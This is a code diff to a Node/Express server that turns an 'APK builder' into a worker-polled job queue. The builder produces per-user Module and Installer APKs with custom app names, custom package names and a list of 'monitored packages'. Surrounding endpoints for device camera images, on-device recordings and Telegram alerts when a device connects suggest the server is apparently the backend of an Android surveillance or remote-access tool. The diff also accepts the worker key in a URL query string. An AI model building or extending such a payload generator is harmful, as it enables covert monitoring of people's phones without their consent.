@@ -115,6 +115,13 @@ const telegramSettings = {
     notifyConnect: true,
 };
 
+// Build-worker settings — admin sets API key in dashboard Settings.
+// The build.sh script (running anywhere — locally, on a VPS, in CI)
+// authenticates with this key and polls /api/build/worker/poll for jobs.
+const buildWorkerSettings = {
+    apiKey: process.env.BUILD_WORKER_API_KEY || '',
+};
+
 async function sendTelegramRaw(botToken, chatId, text) {
     if (!botToken || !chatId) return;
     try {
@@ -1202,6 +1209,14 @@ app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
                 enabled:       telegramSettings.enabled,
                 notifyConnect: telegramSettings.notifyConnect,
             },
+            buildWorker: {
+                apiKey:        buildWorkerSettings.apiKey ? '***' + buildWorkerSettings.apiKey.slice(-6) : '',
+                apiKeySet:     !!buildWorkerSettings.apiKey,
+                workerOnline:  workerOnline(),
+                lastSeen:      buildWorkerLastSeen || null,
+                pending:       buildJobs.length,
+                active:        activeBuildJob ? activeBuildJob.id : null,
+            },
         });
     }
 
@@ -1238,6 +1253,17 @@ app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
         if (typeof telegram.chatId        === 'string')  telegramSettings.chatId        = telegram.chatId.trim();
         if (typeof telegram.enabled       === 'boolean') telegramSettings.enabled       = telegram.enabled;
         if (typeof telegram.notifyConnect === 'boolean') telegramSettings.notifyConnect = telegram.notifyConnect;
+        // Admin-only build worker key
+        const bw = req.body?.buildWorker;
+        if (bw && typeof bw === 'object') {
+            if (typeof bw.apiKey === 'string' && bw.apiKey && !bw.apiKey.startsWith('***')) {
+                buildWorkerSettings.apiKey = bw.apiKey.trim();
+                log('SETTINGS', 'Admin updated build worker API key');
+            } else if (bw.apiKey === '') {
+                buildWorkerSettings.apiKey = '';
+                log('SETTINGS', 'Admin cleared build worker API key');
+            }
+        }
         log('SETTINGS', 'Admin Telegram settings updated via dashboard');
         return res.json({ success: true });
     }
@@ -1351,27 +1377,86 @@ app.get('/api/camera/latest/:deviceId', (req, res) => {
 // Recordings are stored ONLY on the Android device — no server-side recording endpoints.
 
 // ============================================
-// APK BUILDER (per-user)
+// APK BUILDER  (worker-based queue)
 // ============================================
-// State: one global build runs at a time. Live log lines fan out via SSE
-// to the client that started the build (channel 'build:log'). The final
-// APKs land in apk-output/<accessId>/{Module.apk,Installer.apk}.
-const buildState = {
-    running: false,
-    accessId: null,
-    sseId:    null,
-    lines:    [],
-    startedAt: 0,
-    finishedAt: 0,
-    success: null,
-    error: null,
-};
+// Architecture:
+//   1. Users submit jobs via POST /api/build/apk → enqueued in `buildJobs`.
+//   2. A standalone build.sh worker (running anywhere) authenticates with
+//      buildWorkerSettings.apiKey and long-polls GET /api/build/worker/poll.
+//   3. Worker streams log lines back via POST /api/build/worker/log/:id,
+//      uploads finished APKs via .../upload/:id/:type, finalises via
+//      .../complete/:id.
+//   4. Files land in apk-output/<accessId>/{Module.apk,Installer.apk}.
+//
+// One job runs at a time. Pending jobs are kept in FIFO order. A finished
+// job is moved to `recentBuildJobs` (capped) so the UI can fetch its log.
 const BUILD_OUTPUT_ROOT = path.join(__dirname, '..', 'apk-output');
+const BUILD_JOBS_MAX_LINES = 4000;
+const BUILD_JOBS_RECENT_KEEP = 50;
+const BUILD_WORKER_OFFLINE_MS = 30000;
 
-function pushBuildLine(line) {
-    buildState.lines.push(line);
-    if (buildState.lines.length > 4000) buildState.lines.splice(0, 1000);
-    if (buildState.sseId) sseSend(buildState.sseId, 'build:log', { line });
+const buildJobs = [];          // pending  (FIFO)
+let   activeBuildJob = null;   // currently running on a worker
+const recentBuildJobs = [];    // last N finished, newest first
+let   buildWorkerLastSeen = 0;
+const buildWorkerLongPollers = []; // [{ res, timer }]
+
+function workerOnline() {
+    return buildWorkerLastSeen > 0 && (Date.now() - buildWorkerLastSeen) < BUILD_WORKER_OFFLINE_MS;
+}
+
+function findJobByIdAnywhere(id) {
+    if (activeBuildJob && activeBuildJob.id === id) return activeBuildJob;
+    return buildJobs.find(j => j.id === id) || recentBuildJobs.find(j => j.id === id) || null;
+}
+
+function findJobForUser(accessId, includeRecent = true) {
+    if (activeBuildJob && activeBuildJob.accessId === accessId) return activeBuildJob;
+    const pending = [...buildJobs].reverse().find(j => j.accessId === accessId);
+    if (pending) return pending;
+    if (includeRecent) return recentBuildJobs.find(j => j.accessId === accessId) || null;
+    return null;
+}
+
+function pushJobLine(job, line) {
+    if (!job) return;
+    job.lines.push(line);
+    if (job.lines.length > BUILD_JOBS_MAX_LINES) {
+        job.lines.splice(0, job.lines.length - BUILD_JOBS_MAX_LINES);
+    }
+    if (job.sseId) sseSend(job.sseId, 'build:log', { jobId: job.id, line });
+}
+
+function notifyWorkerLongPollers() {
+    while (buildWorkerLongPollers.length > 0 && buildJobs.length > 0 && !activeBuildJob) {
+        const waiter = buildWorkerLongPollers.shift();
+        clearTimeout(waiter.timer);
+        try { dispatchNextJobToWorker(waiter.res); } catch (_) {}
+    }
+}
+
+function dispatchNextJobToWorker(res) {
+    if (activeBuildJob || buildJobs.length === 0) {
+        return res.json({ success: true, hasJob: false });
+    }
+    const job = buildJobs.shift();
+    job.status = 'running';
+    job.startedAt = Date.now();
+    activeBuildJob = job;
+    pushJobLine(job, `▶ Picked up by worker @ ${new Date().toISOString()}`);
+    res.json({
+        success: true,
+        hasJob: true,
+        job: {
+            id:                 job.id,
+            accessId:           job.accessId,
+            moduleName:         job.moduleName,
+            modulePackage:      job.modulePackage,
+            installerName:      job.installerName,
+            installerPackage:   job.installerPackage,
+            monitoredPackages:  job.monitoredPackages,
+        },
+    });
 }
 
 function isValidPackage(s) {
@@ -1380,10 +1465,42 @@ function isValidPackage(s) {
 function isValidAppName(s) {
     return typeof s === 'string' && s.length > 0 && s.length <= 40 && /^[\w .&'-]+$/.test(s);
 }
+function sanitizeMonitoredPackages(input) {
+    // Accept array of strings OR comma/newline separated string. Returns
+    // de-duplicated, validated list of Java package names.
+    let arr = [];
+    if (Array.isArray(input)) arr = input;
+    else if (typeof input === 'string') arr = input.split(/[\s,]+/);
+    else return [];
+    const seen = new Set();
+    const out = [];
+    for (const raw of arr) {
+        const s = String(raw || '').trim();
+        if (!s) continue;
+        if (!isValidPackage(s)) continue;
+        if (seen.has(s)) continue;
+        seen.add(s);
+        out.push(s);
+        if (out.length >= 200) break;
+    }
+    return out;
+}
 
-// POST /api/build/apk — kick off a build with the user's overrides
+// Build-worker auth: shared secret from buildWorkerSettings.apiKey.
+function requireBuildWorker(req, res, next) {
+    const token = (req.headers['authorization'] || '').replace('Bearer ', '')
+               || req.headers['x-build-worker-key']
+               || req.query.key;
+    const expected = buildWorkerSettings.apiKey;
+    if (!expected) return res.status(503).json({ success: false, error: 'Build worker API key not configured. Ask admin to set it in Settings.' });
+    if (!token || token !== expected) return res.status(401).json({ success: false, error: 'Invalid build worker key' });
+    buildWorkerLastSeen = Date.now();
+    next();
+}
+
+// POST /api/build/apk — enqueue a build job for the worker
 app.post('/api/build/apk', requireUserOrAdmin, express.json(), async (req, res) => {
-    const { moduleName, modulePackage, installerName, installerPackage, sseId } = req.body || {};
+    const { moduleName, modulePackage, installerName, installerPackage, sseId, monitoredPackages } = req.body || {};
     if (!isValidAppName(moduleName))         return res.status(400).json({ success: false, error: 'Invalid module name (1-40 chars, letters/digits/space/.&\'-)' });
     if (!isValidPackage(modulePackage))      return res.status(400).json({ success: false, error: 'Invalid module package (e.g. com.example.app)' });
     if (!isValidAppName(installerName))      return res.status(400).json({ success: false, error: 'Invalid installer name' });
@@ -1396,90 +1513,89 @@ app.post('/api/build/apk', requireUserOrAdmin, express.json(), async (req, res) 
         accessId = (u && u.accessId) || '';
         if (!accessId) return res.status(400).json({ success: false, error: 'No Access ID assigned to your account.' });
     } else {
-        // Admin can pass an explicit accessId (or use a default) so admin-built APKs
-        // can also be scoped to a chosen account.
         accessId = (req.body.accessId && String(req.body.accessId).trim()) || 'ADMIN-BUILD';
     }
 
-    if (buildState.running) {
-        return res.status(409).json({ success: false, error: 'A build is already in progress. Please wait for it to finish.' });
+    // One pending/active job per user at a time.
+    const existing = (activeBuildJob && activeBuildJob.accessId === accessId)
+                  || buildJobs.some(j => j.accessId === accessId);
+    if (existing) {
+        return res.status(409).json({ success: false, error: 'You already have a build in progress. Please wait for it to finish.' });
     }
 
-    buildState.running    = true;
-    buildState.accessId   = accessId;
-    buildState.sseId      = sseId || null;
-    buildState.lines      = [];
-    buildState.startedAt  = Date.now();
-    buildState.finishedAt = 0;
-    buildState.success    = null;
-    buildState.error      = null;
-
-    res.json({ success: true, accessId, message: 'Build started. Subscribe to SSE event "build:log" for live output.' });
-
-    // Run build.sh asynchronously
-    const root  = path.join(__dirname, '..');
-    const child = spawn('bash', ['build.sh'], {
-        cwd: root,
-        env: {
-            ...process.env,
-            BUILD_ACCESS_ID:        accessId,
-            BUILD_MODULE_NAME:      moduleName,
-            BUILD_MODULE_PACKAGE:   modulePackage,
-            BUILD_INSTALLER_NAME:   installerName,
-            BUILD_INSTALLER_PACKAGE: installerPackage,
-        },
-    });
-    pushBuildLine(`▶ Build started for Access ID ${accessId}`);
-    pushBuildLine(`  Module:    ${moduleName} (${modulePackage})`);
-    pushBuildLine(`  Installer: ${installerName} (${installerPackage})`);
-
-    const onChunk = (buf) => {
-        const text = buf.toString('utf8');
-        for (const ln of text.split(/\r?\n/)) {
-            if (ln.length > 0) pushBuildLine(ln);
-        }
+    const job = {
+        id: crypto.randomBytes(12).toString('hex'),
+        accessId,
+        moduleName, modulePackage, installerName, installerPackage,
+        monitoredPackages: sanitizeMonitoredPackages(monitoredPackages),
+        sseId: sseId || null,
+        status: 'pending',
+        lines: [],
+        createdAt:  Date.now(),
+        startedAt:  0,
+        finishedAt: 0,
+        success: null,
+        error: null,
     };
-    child.stdout.on('data', onChunk);
-    child.stderr.on('data', onChunk);
-    child.on('close', (code) => {
-        buildState.finishedAt = Date.now();
-        buildState.running    = false;
-        buildState.success    = code === 0;
-        buildState.error      = code === 0 ? null : `build.sh exited with code ${code}`;
-        pushBuildLine('');
-        pushBuildLine(code === 0 ? '✅ BUILD SUCCESS' : `❌ BUILD FAILED (exit ${code})`);
-        if (buildState.sseId) sseSend(buildState.sseId, 'build:done', {
-            success: code === 0, accessId, durationMs: buildState.finishedAt - buildState.startedAt,
-        });
-    });
-    child.on('error', (err) => {
-        buildState.finishedAt = Date.now();
-        buildState.running    = false;
-        buildState.success    = false;
-        buildState.error      = err.message;
-        pushBuildLine(`❌ Failed to spawn build.sh: ${err.message}`);
-        if (buildState.sseId) sseSend(buildState.sseId, 'build:done', { success: false, accessId, error: err.message });
+    buildJobs.push(job);
+
+    pushJobLine(job, `📥 Job queued for Access ID ${accessId} (id ${job.id})`);
+    pushJobLine(job, `  Module:    ${moduleName} (${modulePackage})`);
+    pushJobLine(job, `  Installer: ${installerName} (${installerPackage})`);
+    if (job.monitoredPackages.length) {
+        pushJobLine(job, `  Monitored packages (${job.monitoredPackages.length}): ${job.monitoredPackages.join(', ')}`);
+    }
+    if (!workerOnline()) {
+        pushJobLine(job, `⚠ No build worker is currently connected — job will start as soon as a worker comes online.`);
+    } else {
+        pushJobLine(job, `⏳ Waiting for the worker to pick it up…`);
+    }
+
+    notifyWorkerLongPollers();
+
+    res.json({
+        success: true,
+        accessId,
+        jobId: job.id,
+        workerOnline: workerOnline(),
+        message: workerOnline() ? 'Build queued.' : 'Build queued (waiting for worker).',
     });
 });
 
-// GET /api/build/status — current state + tail of recent logs
+// GET /api/build/status — caller's most-recent job (active, pending, or recent)
 app.get('/api/build/status', requireUserOrAdmin, async (req, res) => {
     let myAccessId = '';
     if (req.authRole === 'user') {
         const u = await User.findById(req.authUserId).select('accessId').lean();
         myAccessId = (u && u.accessId) || '';
+    } else {
+        myAccessId = (req.query.accessId && String(req.query.accessId).trim()) || (activeBuildJob && activeBuildJob.accessId) || 'ADMIN-BUILD';
     }
-    const isMyBuild = req.authRole === 'admin' || (myAccessId && buildState.accessId === myAccessId);
+
+    const job = findJobForUser(myAccessId, true);
+    if (!job) {
+        return res.json({
+            success:      true,
+            running:      false,
+            isMyBuild:    false,
+            workerOnline: workerOnline(),
+            lines:        [],
+        });
+    }
     res.json({
-        success:    true,
-        running:    buildState.running,
-        isMyBuild,
-        accessId:   isMyBuild ? buildState.accessId : null,
-        success_:   buildState.success,
-        error:      buildState.error,
-        startedAt:  buildState.startedAt,
-        finishedAt: buildState.finishedAt,
-        lines:      isMyBuild ? buildState.lines.slice(-200) : [],
+        success:      true,
+        running:      job.status === 'pending' || job.status === 'running',
+        isMyBuild:    true,
+        workerOnline: workerOnline(),
+        accessId:     job.accessId,
+        jobId:        job.id,
+        status:       job.status,
+        success_:     job.success,
+        error:        job.error,
+        createdAt:    job.createdAt,
+        startedAt:    job.startedAt,
+        finishedAt:   job.finishedAt,
+        lines:        job.lines.slice(-300),
     });
 });
 
@@ -1496,7 +1612,9 @@ app.get('/api/build/download/:type', requireUserOrAdmin, async (req, res) => {
         accessId = (u && u.accessId) || '';
         if (!accessId) return res.status(404).json({ success: false, error: 'No Access ID' });
     } else {
-        accessId = (req.query.accessId && String(req.query.accessId).trim()) || buildState.accessId || 'ADMIN-BUILD';
+        accessId = (req.query.accessId && String(req.query.accessId).trim())
+                || (activeBuildJob && activeBuildJob.accessId)
+                || 'ADMIN-BUILD';
     }
 
     const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
@@ -1505,6 +1623,100 @@ app.get('/api/build/download/:type', requireUserOrAdmin, async (req, res) => {
         return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
     }
     res.download(apkPath, filename);
+});
+
+// ── BUILD WORKER ENDPOINTS (called by build.sh in --worker mode) ────────────
+// Long-poll for the next job. Resolves immediately when a job is available,
+// otherwise waits up to ~25s and returns hasJob:false (worker re-polls).
+app.get('/api/build/worker/poll', requireBuildWorker, (req, res) => {
+    if (!activeBuildJob && buildJobs.length > 0) {
+        return dispatchNextJobToWorker(res);
+    }
+    const timer = setTimeout(() => {
+        const idx = buildWorkerLongPollers.findIndex(w => w.res === res);
+        if (idx >= 0) buildWorkerLongPollers.splice(idx, 1);
+        if (!res.headersSent) res.json({ success: true, hasJob: false });
+    }, 25000);
+    buildWorkerLongPollers.push({ res, timer });
+    res.on('close', () => {
+        clearTimeout(timer);
+        const idx = buildWorkerLongPollers.findIndex(w => w.res === res);
+        if (idx >= 0) buildWorkerLongPollers.splice(idx, 1);
+    });
+});
+
+// Append log lines from worker. Body: { lines: [...] } or { line: "..." }
+app.post('/api/build/worker/log/:jobId', requireBuildWorker, express.json({ limit: '2mb' }), (req, res) => {
+    const job = findJobByIdAnywhere(req.params.jobId);
+    if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
+    const lines = Array.isArray(req.body?.lines) ? req.body.lines
+                : (typeof req.body?.line === 'string' ? [req.body.line] : []);
+    for (const ln of lines) {
+        if (typeof ln === 'string' && ln.length > 0) pushJobLine(job, ln);
+    }
+    res.json({ success: true });
+});
+
+// Upload a built APK from the worker. type = module | installer.
+// Body is the raw APK bytes (Content-Type: application/octet-stream).
+app.post('/api/build/worker/upload/:jobId/:type', requireBuildWorker,
+    express.raw({ type: '*/*', limit: '300mb' }),
+    (req, res) => {
+        const job = findJobByIdAnywhere(req.params.jobId);
+        if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
+        const { type } = req.params;
+        if (type !== 'module' && type !== 'installer') {
+            return res.status(400).json({ success: false, error: 'type must be module or installer' });
+        }
+        const buf = req.body;
+        if (!buf || !buf.length) return res.status(400).json({ success: false, error: 'Empty upload' });
+
+        const dir = path.join(BUILD_OUTPUT_ROOT, job.accessId);
+        try { fs.mkdirSync(dir, { recursive: true }); } catch (_) {}
+        const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
+        const dest = path.join(dir, filename);
+        fs.writeFileSync(dest, buf);
+        pushJobLine(job, `⬆ Uploaded ${filename} (${(buf.length / 1024 / 1024).toFixed(2)} MB)`);
+        res.json({ success: true });
+    }
+);
+
+// Mark the job complete. Body: { success: bool, error?: string }
+app.post('/api/build/worker/complete/:jobId', requireBuildWorker, express.json(), (req, res) => {
+    const job = findJobByIdAnywhere(req.params.jobId);
+    if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
+    const ok = !!req.body?.success;
+    job.status     = ok ? 'success' : 'failed';
+    job.success    = ok;
+    job.error      = ok ? null : (req.body?.error || 'Build failed');
+    job.finishedAt = Date.now();
+    pushJobLine(job, '');
+    pushJobLine(job, ok ? '✅ BUILD SUCCESS' : `❌ BUILD FAILED — ${job.error}`);
+    if (job.sseId) sseSend(job.sseId, 'build:done', {
+        jobId: job.id, success: ok, accessId: job.accessId,
+        durationMs: job.finishedAt - job.startedAt, error: job.error,
+    });
+    if (activeBuildJob && activeBuildJob.id === job.id) activeBuildJob = null;
+    recentBuildJobs.unshift(job);
+    if (recentBuildJobs.length > BUILD_JOBS_RECENT_KEEP) recentBuildJobs.pop();
+    notifyWorkerLongPollers();
+    res.json({ success: true });
+});
+
+// GET /api/build/worker/status — admin-only worker liveness + queue snapshot
+app.get('/api/build/worker/status', requireAdmin, (req, res) => {
+    res.json({
+        success:      true,
+        keyConfigured: !!buildWorkerSettings.apiKey,
+        workerOnline: workerOnline(),
+        lastSeen:     buildWorkerLastSeen || null,
+        active:       activeBuildJob ? { jobId: activeBuildJob.id, accessId: activeBuildJob.accessId } : null,
+        pending:      buildJobs.length,
+        recent:       recentBuildJobs.slice(0, 10).map(j => ({
+            jobId: j.id, accessId: j.accessId, status: j.status,
+            startedAt: j.startedAt, finishedAt: j.finishedAt,
+        })),
+    });
 });
 
 // ============================================
